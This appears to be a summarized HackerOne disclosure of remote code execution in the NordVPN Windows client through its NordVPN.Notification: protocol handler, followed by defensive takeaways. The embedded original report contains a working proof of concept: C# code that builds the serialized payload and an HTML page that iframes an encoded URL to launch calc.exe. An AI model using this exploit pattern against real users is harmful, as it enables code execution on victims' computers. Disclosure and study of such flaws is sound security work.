# Remote Code Execution via Windows Custom Protocol Handler in NordVPN Client

## Metadata
- **Source:** HackerOne
- **Report:** 1001255 | https://hackerone.com/reports/1001255
- **Submitted:** 2020-10-07
- **Reporter:** cyku
- **Program:** NordVPN
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Remote Code Execution, Arbitrary Command Execution, Unsafe Protocol Handler, Insecure Deserialization, CWE-94: Improper Control of Generation of Code
- **CVEs:** None
- **Category:** memory-binary

## Summary
NordVPN Windows client registered custom protocol handlers (NordVPN: and NordVPN.Notification:) that could be triggered from web browsers. The NordVPN.Notification: protocol handler deserializes untrusted data and passes it to Process.Start() without validation, allowing arbitrary command execution when a user clicks a malicious link.

## Attack scenario
1. Attacker crafts a malicious URL using NordVPN.Notification: protocol with serialized payload containing arbitrary command (e.g., 'calc.exe')
2. Attacker hosts HTML page containing the malicious URL as an iframe or link
3. Victim visits attacker's webpage while NordVPN client is installed
4. Browser prompts user to confirm opening the URL with NordVPN application
5. User clicks 'Open NordVPN' to proceed
6. NordVPN client deserializes the payload and passes command to Process.Start(), executing arbitrary code with user privileges

## Root cause
The ListenNotificationOpenUrl class in NordVPN client deserializes untrusted data from custom protocol handlers without validation. The deserialized NotificationActionArgs object containing user-controlled 'OpenUrl' parameter is directly passed to Process.Start(), which interprets the first argument as a command to execute rather than a URL.

## Attacker mindset
Attacker recognized that custom protocol handlers bypass same-origin policy and provide direct IPC with local applications. By reverse engineering the NordVPN binary and identifying the deserialization logic, the attacker found that the 'OpenUrl' parameter could be abused to inject arbitrary commands, turning a notification handler into a RCE vector.

## Defensive takeaways
- Validate and sanitize all data received through custom protocol handlers before processing
- Use allowlists for expected protocol parameters rather than blacklists
- Avoid deserializing untrusted data; use safer alternatives or implement strict type checking
- Never pass user-controlled input directly to Process.Start() or similar execution functions
- Implement input validation to ensure parameters match expected URL format
- Require explicit user confirmation with clear indication of what command will be executed
- Apply principle of least privilege to application execution context
- Implement sandboxing for operations triggered by web content

## Variant hunting
Search for other applications registering custom protocols that accept serialized parameters
Review desktop applications for unsafe use of ObjectCompressor or similar deserialization methods
Audit Process.Start() calls across installed applications for unsanitized external input
Identify protocol handlers that bypass URL validation for command execution
Check for other notification/messaging systems in applications that deserialize untrusted data
Review applications using Newtonsoft.Json for unsafe deserialization patterns

## MITRE ATT&CK
- T1190
- T1203
- T1559
- T1559.001
- T1204.001
- T1566.002

## Notes
This vulnerability demonstrates the risks of registering custom protocol handlers without proper input validation. The attack requires user interaction (clicking a link) but the confirmation dialog provides minimal security value since users typically trust installed applications. The use of serialized object compression adds obfuscation but not security. Version tested: 6.31.5.0. The vulnerability combines insecure deserialization with unsafe process execution, creating a critical RCE vector accessible from any webpage.

## Full report
<details><summary>Expand</summary>

## Summary:
The NordVPN windows client application registered two custom protocols **NordVPN:** and **NordVPN.Notification:** for process communication. This makes us are able to  communicate with NordVPN.exe from web browser.
After looking the executable binary, I noticed the class **NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl** eventually calls function  **Process.Start** with controllable argument, and this notification can be triggered through custom protocol **NordVPN.Notification:**. 
So it's possible to execute arbitrary system command from web browser.

## Steps To Reproduce:

  1. Create the malicious URL, the below is my script to generate the URL, it requires importing "Newtonsoft.Json.dll" and "NordVpn.Core.dll".

    ```csharp
    // Program.cs
    using System;
    using System.Collections.Generic;
    using NordVpn.Core.Tools;
    using NordVpn.Core.Models.ToastNotifications.Notifications;
    using System.Diagnostics;

    namespace ExploitApp
    {
        class Program
        {
            static void Main(string[] args)
            {
                Dictionary<string, string> arguments = new Dictionary<string, string>();
                arguments["OpenUrl"] = "calc.exe";
                NotificationActionArgs toastArgs = new NotificationActionArgs("", arguments);
                String exploit = ObjectCompressor.CompressObject(toastArgs);
                Console.Write(String.Format("NordVPN.Notification:{0}", exploit));
                Console.ReadKey();
            }
        }
    }
    ```

  2. Add the URL into a html file with iframe tag, then serves it on HTTP server.

    ```html
    <!-- exploit.html -->
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Exploit</title>
    </head>
    <body>
        <iframe src="NordVPN.Notification:UAAAAB+LCAAAAAAABAANy0EKgCAQBdC7/LV0AHdC0K5WHWAQi4FpFB2hkO5eb/8Glpp7gQcc1mx8cCTjrEFJHuPYZjKC1y7iEOrZr6TW4Ae2knSv8tdIEqd0J7zvBy7afohQAAAA"></iframe>
    </body>
    </html>
    ```

  3. Open the html file in the browser. Modern web browser may popup a window to confirm to open NordVPN.exe, if we choose "Open NordVPN", the command will be executed and popup a calc.exe.

## Proof of Concept Gif

Tested on Windows client lastest version 6.31.5.0.

{F1024995}

## Additional Information

The below is the simple call stack to Process.Start from ListenNotificationOpenUrl.
```
NordVPN.exe/NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl.OnInteraction(NotificationActionArgs args)
    NordVpn.Application.Core.dll/NordVpn.Application.Core.ViewModels.Shell.ShellViewModel.Handle(ShowBrowserMessage message)
        NordVPN.exe/NordVpn.Views.Shell.FaultHandlingDefaultBrowser.Open(string url)
            Process.Start(string fileName);
```

## Impact

Possible to execute system command on victim's computer and take control of the computer.

</details>

---
*Analysed by Claude on 2026-05-11*
